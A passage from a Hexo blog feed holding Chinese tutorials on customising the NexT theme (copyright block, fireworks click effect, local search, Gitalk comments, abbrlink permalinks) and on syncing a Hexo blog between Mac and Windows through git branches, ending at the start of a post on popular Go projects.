underline;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright:hover .fa-clipboard &#123;</span><br><span class="line">  color: #000;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright .post-url:hover &#123;</span><br><span class="line">  font-weight: normal;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright .copy-path &#123;</span><br><span class="line">  margin-left: 1em;</span><br><span class="line">  width: 1em;</span><br><span class="line">  +mobile()&#123;display:none;&#125;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright .copy-path:hover &#123;</span><br><span class="line">  color: #808080;</span><br><span class="line">  cursor: pointer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改<code>next/layout/_macro/post.swig</code>，在代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">      &#123;% if not is_index %&#125;</span><br><span class="line">        &#123;% include &apos;wechat-subscriber.swig&apos; %&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>之前添加增加如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">      &#123;% if not is_index %&#125;</span><br><span class="line">        &#123;% include &apos;my-copyright.swig&apos; %&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>修改<code>next/source/css/_common/components/post/post.styl</code>文件，在最后一行增加代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@import &quot;my-post-copyright&quot;</span><br></pre></td></tr></table></figure>

<p>保存重新生成即可。<br> 如果要在该博文下面增加版权信息的显示，需要在 Markdown 中增加copyright: true的设置，类似：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hexo-NexT主题配置</span><br><span class="line">date: 2018-01-20 20:41:08</span><br><span class="line">categories: Hexo</span><br><span class="line">tags:</span><br><span class="line">- Hexo</span><br><span class="line">- NexT</span><br><span class="line">top: 100</span><br><span class="line">copyright: ture</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>配置根目录下的<code>_config.yml</code>文件，配置为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;</span><br><span class="line">url: https://wenmobo.github.io/  //你的网站地址</span><br><span class="line">root: /</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br></pre></td></tr></table></figure>

<h2 id="隐藏网页底部powered-By-Hexo-强力驱动"><a href="#隐藏网页底部powered-By-Hexo-强力驱动" class="headerlink" title="隐藏网页底部powered By Hexo / 强力驱动"></a>隐藏网页底部powered By Hexo / 强力驱动</h2><p>打开<code>Blog/themes/next/layout/_partials/footer.swig</code>，注释掉相应代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//用下面的符号注释，注释代码用下面括号括起来</span><br><span class="line">&lt;!-- --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">&lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;</span><br><span class="line"></span><br><span class="line">&#123;% if theme.footer.powered %&#125;</span><br><span class="line">  &lt;div class=&quot;powered-by&quot;&gt;&#123;#</span><br><span class="line">  #&#125;&#123;&#123; __(&apos;footer.powered&apos;, &apos;&lt;a class=&quot;theme-link&quot; target=&quot;_blank&quot; href=&quot;https://hexo.io&quot;&gt;Hexo&lt;/a&gt;&apos;) &#125;&#125;&#123;#</span><br><span class="line">#&#125;&lt;/div&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% if theme.footer.powered and theme.footer.theme.enable %&#125;</span><br><span class="line">  &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% if theme.footer.theme.enable %&#125;</span><br><span class="line">  &lt;div class=&quot;theme-info&quot;&gt;&#123;#</span><br><span class="line">  #&#125;&#123;&#123; __(&apos;footer.theme&apos;) &#125;&#125; &amp;mdash; &#123;#</span><br><span class="line">  #&#125;&lt;a class=&quot;theme-link&quot; target=&quot;_blank&quot; href=&quot;https://github.com/iissnan/hexo-theme-next&quot;&gt;&#123;#</span><br><span class="line">    #&#125;NexT.&#123;&#123; theme.scheme &#125;&#125;&#123;#</span><br><span class="line">  #&#125;&lt;/a&gt;&#123;% if theme.footer.theme.version %&#125; v&#123;&#123; theme.version &#125;&#125;&#123;% endif %&#125;&#123;#</span><br><span class="line">#&#125;&lt;/div&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% if theme.footer.custom_text %&#125;</span><br><span class="line">  &lt;div class=&quot;footer-custom&quot;&gt;&#123;#</span><br><span class="line">  #&#125;&#123;&#123; theme.footer.custom_text &#125;&#125;&#123;#</span><br><span class="line">#&#125;&lt;/div&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<h2 id="修改字体大小"><a href="#修改字体大小" class="headerlink" title="修改字体大小"></a>修改字体大小</h2><p>打开<code>\themes\next\source\css\ _variables\base.styl</code>文件，将<code>$font-size-base</code>改成<code>16px</code>，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$font-size-base            =16px</span><br></pre></td></tr></table></figure>

<h2 id="添加打赏"><a href="#添加打赏" class="headerlink" title="添加打赏"></a>添加打赏</h2><p>打开themes/next/_config.yml中配置如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reward:</span><br><span class="line">  enable: true</span><br><span class="line">  comment: 原创技术分享，您的支持将鼓励我继续创作</span><br><span class="line">  wechatpay: /images/wechatpay.png</span><br><span class="line">  alipay: /images/alipay.jpg</span><br><span class="line">  \#bitcoin: /images/bitcoin.jpg</span><br></pre></td></tr></table></figure>

<p>修改文件<code>next/source/css/_common/components/post/post-reward.styl</code>，然后注释如下即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">#QR &gt; div:hover p &#123;</span><br><span class="line">  animation: roll 0.1s infinite linear;</span><br><span class="line">  -webkit-animation: roll 0.1s infinite linear;</span><br><span class="line">  -moz-animation: roll 0.1s infinite linear;</span><br><span class="line">&#125;*/</span><br></pre></td></tr></table></figure>

<h2 id="点击爆炸效果"><a href="#点击爆炸效果" class="headerlink" title="点击爆炸效果"></a>点击爆炸效果</h2><h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a><strong>效果图</strong></h3><p><img src="/articles/1071f0bc/16.png" alt="img"></p>
<h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a><strong>实现方法</strong></h3><p><code>themes/next/source/js/src</code>里面建一个叫fireworks.js的文件，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;function updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=&quot;#F00&quot;,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;function renderParticule(e)&#123;for(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;return e.endPos.x&#125;,y:function(e)&#123;return e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:&quot;linear&quot;,duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule,offset:0&#125;)&#125;function debounce(e,t)&#123;var a;return function()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(&quot;.fireworks&quot;);if(canvasEl)&#123;var ctx=canvasEl.getContext(&quot;2d&quot;),numberOfParticules=30,pointerX=0,pointerY=0,tap=&quot;mousedown&quot;,colors=[&quot;#FF1461&quot;,&quot;#18FF92&quot;,&quot;#5A87FF&quot;,&quot;#FBF38C&quot;],setCanvasSize=debounce(function()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+&quot;px&quot;,canvasEl.style.height=window.innerHeight+&quot;px&quot;,canvasEl.getContext(&quot;2d&quot;).scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:function()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;&quot;sidebar&quot;!==e.target.id&amp;&amp;&quot;toggle-sidebar&quot;!==e.target.id&amp;&amp;&quot;A&quot;!==e.target.nodeName&amp;&amp;&quot;IMG&quot;!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener(&quot;resize&quot;,setCanvasSize,!1)&#125;&quot;use strict&quot;;function updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=&quot;#F00&quot;,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;function renderParticule(e)&#123;for(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;return e.endPos.x&#125;,y:function(e)&#123;return e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:&quot;linear&quot;,duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule,offset:0&#125;)&#125;function debounce(e,t)&#123;var a;return function()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(&quot;.fireworks&quot;);if(canvasEl)&#123;var ctx=canvasEl.getContext(&quot;2d&quot;),numberOfParticules=30,pointerX=0,pointerY=0,tap=&quot;mousedown&quot;,colors=[&quot;#FF1461&quot;,&quot;#18FF92&quot;,&quot;#5A87FF&quot;,&quot;#FBF38C&quot;],setCanvasSize=debounce(function()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+&quot;px&quot;,canvasEl.style.height=window.innerHeight+&quot;px&quot;,canvasEl.getContext(&quot;2d&quot;).scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:function()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;&quot;sidebar&quot;!==e.target.id&amp;&amp;&quot;toggle-sidebar&quot;!==e.target.id&amp;&amp;&quot;A&quot;!==e.target.nodeName&amp;&amp;&quot;IMG&quot;!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener(&quot;resize&quot;,setCanvasSize,!1)&#125;;</span><br></pre></td></tr></table></figure>

<p>打开<code>themes/next/layout/_layout.swig</code>,在<code>&lt;/body&gt;</code>上面写下如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if theme.fireworks %&#125;</span><br><span class="line">   &lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt; </span><br><span class="line">   &lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">   &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/fireworks.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>打开主题配置文件，在里面最后写下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Fireworks</span><br><span class="line">fireworks: true</span><br></pre></td></tr></table></figure>

<h2 id="添加侧栏推荐阅读"><a href="#添加侧栏推荐阅读" class="headerlink" title="添加侧栏推荐阅读"></a>添加侧栏推荐阅读</h2><h3 id="效果图-1"><a href="#效果图-1" class="headerlink" title="效果图"></a>效果图</h3><p><img src="/articles/1071f0bc/17.png" alt></p>
<h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><p>编辑主题配置文件，如下配置即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Blog rolls</span><br><span class="line">links_icon: link</span><br><span class="line">links_title: 推荐阅读</span><br><span class="line">#links_layout: block</span><br><span class="line">links_layout: inline</span><br><span class="line">links:</span><br><span class="line">  菜鸟教程: https://xxxxx</span><br><span class="line">  自强学堂: https://xxxxx</span><br></pre></td></tr></table></figure>

<h2 id="添加站内搜索"><a href="#添加站内搜索" class="headerlink" title="添加站内搜索"></a>添加站内搜索</h2><p>安装 hexo-generator-search</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>

<p>安装 hexo-generator-searchdb</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>

<p>编辑主题配置文件，设置<code>Local search</code>enable为<code>ture</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Local search</span><br><span class="line"># Dependencies: https://github.com/flashlab/hexo-generator-search</span><br><span class="line">local_search:</span><br><span class="line">  enable: ture</span><br><span class="line">  # if auto, trigger search by changing input</span><br><span class="line">  # if manual, trigger search by pressing enter key or search button</span><br><span class="line">  trigger: auto</span><br><span class="line">  # show top n results per article, show all results by setting to -1</span><br><span class="line">  top_n_per_article: 1</span><br></pre></td></tr></table></figure>

<h2 id="添加评论系统gitalk"><a href="#添加评论系统gitalk" class="headerlink" title="添加评论系统gitalk"></a>添加评论系统gitalk</h2><h3 id="效果图-2"><a href="#效果图-2" class="headerlink" title="效果图"></a>效果图</h3><p><img src="/articles/1071f0bc/18.png" alt></p>
<h3 id="实现方式-1"><a href="#实现方式-1" class="headerlink" title="实现方式"></a>实现方式</h3><p>在github中注册注册新应用，链接：<a href="https://github.com/settings/applications/new" target="_blank" rel="noopener">https://github.com/settings/applications/new</a></p>
<p><img src="/articles/1071f0bc/19.png" alt></p>
<p>参数说明：<br>Application name： # 应用名称，随意<br>Homepage URL： # 网站URL，如<code>https://wandouduoduo.github.io</code><br>Application description # 描述，随意<br>Authorization callback URL：# 网站URL，<code>https://wandouduoduo.github.io</code></p>
<p>点击注册后，页面跳转如下，其中<code>Client ID</code>和<code>Client Secret</code>在后面的配置中需要用到，到时复制粘贴即可：</p>
<p><img src="/articles/1071f0bc/20.png" alt></p>
<p>在主题配置文件<code>next/_config.yml</code>中添加如下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitalk:</span><br><span class="line">  enable: true</span><br><span class="line">  githubID: github帐号  # 例：asdfv1929   </span><br><span class="line">  repo: 仓库名称   # 例：asdfv1929.github.io</span><br><span class="line">  ClientID: Client ID</span><br><span class="line">  ClientSecret: Client Secret</span><br><span class="line">  adminUser: github帐号 #指定可初始化评论账户</span><br><span class="line">  distractionFreeMode: true</span><br></pre></td></tr></table></figure>

<h2 id="修改文章链接"><a href="#修改文章链接" class="headerlink" title="修改文章链接"></a>修改文章链接</h2><p>Hexo 默认的文章链接形式为 <code>domain/year/month/day/postname</code> ，当我们把文章源文件名改掉之后，链接也会改变，很不友好，并且四级目录，不利于 SEO。</p>
<p>因此，使用 <code>hexo-abbrlink</code> 插件，生成文章的永久链接，后期无论怎么修改也不会改变该链接。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure>

<p>在站点配置文件 <code>_config.yml</code> 中修改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">permalink: post/:abbrlink.html</span><br><span class="line">abbrlink: </span><br><span class="line">  alg: crc32 # 算法：crc16(default) and crc32</span><br><span class="line">  rep: hex   # 进制：dec(default) and hex</span><br></pre></td></tr></table></figure>

<p>可选择模式有：</p>
<ul>
<li>crc16 &amp; hex</li>
<li>crc16 &amp; dec</li>
<li>crc32 &amp; hex</li>
<li>crc32 &amp; dec</li>
</ul>
<h2 id="寻找图床"><a href="#寻找图床" class="headerlink" title="寻找图床"></a>寻找图床</h2><p>当向文章中添加图片时，如果图片来源于网络，那么还比较好办，直接引用那个链接即可，不过也有问题，那就是如果那个链接挂了那么你的图片也就无法显示。另外如果你的图片来源于本地，那么更麻烦了。一种做法是使用第三方服务器，比如七牛，当需要插入图片时，先把图片上传到七牛的服务器然后再使用，我觉得很麻烦。这里选择另外一种方法。</p>
<p>首先修改 <code>_config.yml</code> (在站点目录下) 中 <code>post_asset_folder</code> 字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># post_asset_folder: false</span><br><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure>

<p>当设置该字段为 <code>true</code> 时，在建立文件时，Hexo 会自动建立一个与文章同名的文件夹，你就可以把与该文章相关的所有资源都放到那个文件夹，这么一来，你就可以很方便的使用资源。例如，文章 <code>post</code> 需要插入图片 <code>test.png</code> 时，就可以使用 <code>[图片上传失败...(image-773548-1546505826136)]</code> 。</p>
<p>问题是这样在本地显示没有问题，但是发布之后就无法显示，使用 <code>hexo-asset-image</code> 插件来解决。</p>
<p>在博客根目录右击打开 <code>git bash</code> ，执行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>

<p>重新生成之后就可以在你自己的网页上正常显示了。</p>
<blockquote>
<p>注意：对于因为 SEO 优化，使用 <code>abbrlink</code> 插件修改过文章链接的朋友而言，这种方法还需要进一步修改一下。由于原来的 <code>permalink: :year/:month/:day/:title/</code> 变成了 <code>permalink: post/:abbrlink.html</code> 。打开博客根目录下 <code>node_modules\hexo-asset-image\index.js</code> ，增加一行命令，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;   var config = hexo.config;</span><br><span class="line">&gt;   if(config.post_asset_folder)&#123;</span><br><span class="line">&gt;     var link = data.permalink;</span><br><span class="line">&gt;     link = link.replace(&apos;.html&apos;, &apos;/&apos;);    //新增加，针对修改后的 permalink</span><br><span class="line">&gt;   var beginPos = getPosition(link, &apos;/&apos;, 3) + 1;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>之后就可以正常显示了，仅供参考。对于修改成其他链接形式的朋友也有一定的参考意义。</p>
</blockquote>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>mac和windows等多台机器上协同写hexo博客的实现</title>
    <url>/articles/902dbefe.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在公司上的mac机器上部署了hexo博客，家里的电脑是windows机，想在家和公司都可以写博客，要怎么实现呢？</p>
<a id="more"></a>

<h2 id="Mac机器操作"><a href="#Mac机器操作" class="headerlink" title="Mac机器操作"></a>Mac机器操作</h2><h3 id="在github上新建远程仓库"><a href="#在github上新建远程仓库" class="headerlink" title="在github上新建远程仓库"></a>在github上新建远程仓库</h3><p>将原来的page项目删除，新建一个和原来名字一样的空项目。不用初始README.md<br>此时只有一个空的master分支。</p>
<h3 id="本地初始化一个Hexo项目"><a href="#本地初始化一个Hexo项目" class="headerlink" title="本地初始化一个Hexo项目"></a>本地初始化一个Hexo项目</h3><p><strong>注意：本地的目录不要动</strong>，<strong>可以重命名</strong>。</p>
<p>重新新建一个空目录，作为你的博客目录。进入该目录，初始化一个Hexo项目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init</span><br><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git *--save</span><br></pre></td></tr></table></figure>

<p>然后用自己原来博客里的文件替换掉这里的<code>source\</code>, <code>scaffolds\</code>, <code>themes\</code>,<code>_config.yml</code>替换成自己原来博客里的。<strong>注意，一定要把themes/next中的.git/目录删除</strong></p>
<h3 id="项目目录上传至远程仓库"><a href="#项目目录上传至远程仓库" class="headerlink" title="项目目录上传至远程仓库"></a>项目目录上传至远程仓库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">//把博客目录下所有文件推送到master分支</span><br><span class="line">git remote add origin git@github:chown-jane-y/chown-jane-y.github.io.git</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;first add hexo source code&quot;</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure>

<p>注意：如果不小心初始化了README.md 在执行 git push origin master 会失败.。此时先执行以下命令进行代码合并</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure>

<h3 id="本地仓库新建分支"><a href="#本地仓库新建分支" class="headerlink" title="本地仓库新建分支"></a>本地仓库新建分支</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.创建本地分支</span><br><span class="line">git branch 分支名，例如：git branch hexo</span><br><span class="line"></span><br><span class="line">2.切换本地分支</span><br><span class="line">git checkout 分支名，例如从master切换到分支：</span><br><span class="line">git checkout hexo</span><br><span class="line"></span><br><span class="line">3.远程分支就是本地分支push到服务器上。比如master就是一个最典型的远程分支（默认）。</span><br><span class="line">git push origin hexo</span><br><span class="line"></span><br><span class="line">4.设置默认分支 </span><br><span class="line">git branch --set-upstream-to=origin/hexo hexo</span><br></pre></td></tr></table></figure>

<p>新建一个分支hexo(名字可以自定义)，这时候hexo分支和master分支的内容一样，都是hexo的源文件。</p>
<p>并把hexo设为默认分支，这样的话在另外一台机器上克隆下来就直接进入hexo分支，并且以后所有操作都是在hexo分支下完成。</p>
<p>为什么需要这个额外的分支呢？</p>
<p>因为hexo d只把静态网页文件部署到master分支上，所以你换了另外一台电脑，就无法pull下来继续写博客了。有了hexo分支的话，就可以把hexo分支中的源文件(配置文件、主题样式等)pull下来，再hexo g的话就可以生成一模一样的静态文件了</p>
<h3 id="部署博客"><a href="#部署博客" class="headerlink" title="部署博客"></a>部署博客</h3><p> <strong>先把根目录下的_config.yml配置文件中branch一定要填master，否则hexo d就会部署到hexo分支下，然后再部署</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g -d</span><br><span class="line">如果提示 RROR Deployer not found: git 说明前面 npm install --save hexo-deployer-git 没有执行成功 再执行一次</span><br><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure>

<p>这样博客已经成功部署到master分支，这时候到github查看两个分支的内容，hexo分支里是源文件，master里是静态文件。</p>
<h2 id="windows机器操作"><a href="#windows机器操作" class="headerlink" title="windows机器操作"></a>windows机器操作</h2><p>另外一台windows电脑上，应该如何操作呢？</p>
<h3 id="将博客项目克隆下来"><a href="#将博客项目克隆下来" class="headerlink" title="将博客项目克隆下来"></a>将博客项目克隆下来</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/xxx/xxx.github.io.git</span><br></pre></td></tr></table></figure>

<h3 id="创建源文件分支"><a href="#创建源文件分支" class="headerlink" title="创建源文件分支"></a>创建源文件分支</h3><p>克隆下来的仓库是master分支（虽然把hexo设为默认分支了, 但是clone下来还是master分支）这时候需要切换一下分支，所以可以在这基础上继续写博客了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看所有分支*</span><br><span class="line">git branch -a</span><br><span class="line">#切换分支</span><br><span class="line">git checkout hexo</span><br></pre></td></tr></table></figure>

<h3 id="依赖包安装"><a href="#依赖包安装" class="headerlink" title="依赖包安装"></a>依赖包安装</h3><p>但是由于<code>.gitignore</code>文件中过滤了<code>node_modules\</code>，所以克隆下来的目录里没有<code>node_modules\</code>，这是hexo所需要的组件，所以要在该目录中重新安装hexo，<strong>但不需要hexo init</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo</span><br><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<h3 id="测试验证"><a href="#测试验证" class="headerlink" title="测试验证"></a>测试验证</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>

<h2 id="日常操作"><a href="#日常操作" class="headerlink" title="日常操作"></a>日常操作</h2><h3 id="更新源码"><a href="#更新源码" class="headerlink" title="更新源码"></a>更新源码</h3><p>不管你本地的仓库是否是最新的，都先pull一下，以防万一：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pull origin hexo</span><br></pre></td></tr></table></figure>

<h3 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new &quot;title&quot;</span><br></pre></td></tr></table></figure>

<p>然后打开source/_posts/title.md，撰写博文。</p>
<h3 id="上传源码"><a href="#上传源码" class="headerlink" title="上传源码"></a>上传源码</h3><p>先推送到hexo分支上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;add article xxx&quot;</span><br><span class="line">git push origin hexo</span><br></pre></td></tr></table></figure>

<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>部署到master分支上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>神级的Go开源项目</title>
    <url>/articles/b45f8ddd.html</url>
    <content><![CDATA[<h2 id="Golang-go"><a href="#Golang-go" class="headerlink" title="Golang/go"></a>Golang/go</h2><p>介绍：<br>Go（又称Golang）是Google开发的一种静态强类型、编译型、并发型，并具有垃圾回收功能的编程语言。go本身，也是用go语言实现的，包括他的编译器。与C++相比，Go并不包括如枚举、异常处理、继承、泛型、断言、虚函数等功能，但增加了 切片(Slice) 型、并发、管道、垃圾回收、接口（Interface）等特性的语言级支持。Go 2.0版本将支持泛型，对于断言的存在，则持负面态度，同时也为自己不提供类型继承来辩护。</p>
<p>star数：53789<br>地址：<br><a href="https://github.com/golang/go" target="_blank" rel="noopener">https://github.com/golang/go</a></p>
<a id="more"></a>

